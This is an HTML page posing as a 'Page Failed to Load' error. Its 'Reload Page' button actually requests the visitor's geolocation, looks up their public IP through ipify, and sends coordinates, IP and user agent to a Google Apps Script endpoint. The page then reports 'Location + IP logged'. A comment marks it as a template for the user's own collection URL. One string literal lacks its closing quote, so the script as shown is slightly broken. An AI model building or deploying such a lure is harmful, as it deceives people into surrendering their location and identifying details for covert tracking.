<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Page Not Loaded</title>

    <style>
        body {
            background-color: #f2f2f2;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 100px;
        }

        .container {
            background: white;
            width: 400px;
            margin: auto;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
        }

        h1 {
            color: #555;
        }

        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background: #007bff;
            color: white;
        }

        button:hover {
            background: #0056b3;
        }

        #insert {
            margin-top: 20px;
            color: #333;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="container">

        <h1>⚠ Page Failed to Load</h1>

        <p>Something went wrong. Try reloading.</p>


        <button onclick="getLocation()">Reload Page</button>

        <p id="insert"></p>

    </div>

<script>

const x = document.getElementById("insert");

// PUT YOUR GOOGLE SCRIPT URL HERE
const API_URL = "https://script.google.com/macros/s/AKfycbwri0tcRllg0E7sBvx9Y_6dyywsj6V35Qk7NNXLhiOaDqNdyeVHVFc0Ij55oYAX68-nIw/exec;

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json", {
      cache: "no-store"
    });

    const data = await res.json();
    return data.ip || "Unknown";

  } catch (e) {
    console.error("IP error:", e);
    return "Failed";
  }
}

// MUST be global (not inside anything)
function getLocation() {

  if (!navigator.geolocation) {
    x.innerHTML = "Geolocation not supported.";
    return;
  }

  x.innerHTML = "Getting location + IP...";

  navigator.geolocation.getCurrentPosition(
    sendLocation,
    showError
  );
}

async function sendLocation(position) {

  const ip = await getIP();

  console.log("IP:", ip);

  const data = {
    lat: position.coords.latitude,
    lon: position.coords.longitude,
    agent: navigator.userAgent,
    ip: ip
  };

fetch(API_URL, {
  method: "POST",
  body: JSON.stringify(data)
})

  .then(() => {
    x.innerHTML = "Location + IP logged ✔";
  })
  .catch(err => {
    console.error(err);
    x.innerHTML = "Send failed.";
  });
}

function showError(error) {

  if (error.code === error.PERMISSION_DENIED) {
    x.innerHTML = "Permission denied.";
  } else {
    x.innerHTML = "Location error.";
  }

}

</script>



</body>
</html>
